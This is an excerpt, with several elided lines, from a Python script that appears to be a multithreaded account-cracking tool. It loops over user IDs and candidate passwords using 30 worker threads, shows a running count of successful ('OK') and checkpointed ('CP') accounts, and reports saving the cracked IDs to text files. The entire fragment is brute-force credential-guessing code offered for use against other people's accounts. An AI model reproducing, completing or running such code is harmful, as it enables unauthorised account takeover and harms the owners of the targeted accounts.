...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('[×] Exm: 9377, 9378, 9370, 9374, 9376, 9379')
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            asha.submit(Abid,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as Abid-OK.txt')
    print(' [✓] CP Id Save as Abid-CP.txt')
    print('-------------------')
def Abid(uid,pwx,tl):
    global loop
    global cps
    ...
    try:
        for ps in pwx:
            ...
            session = requests.Session()
            sys.stdout.write('\r[Abid]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
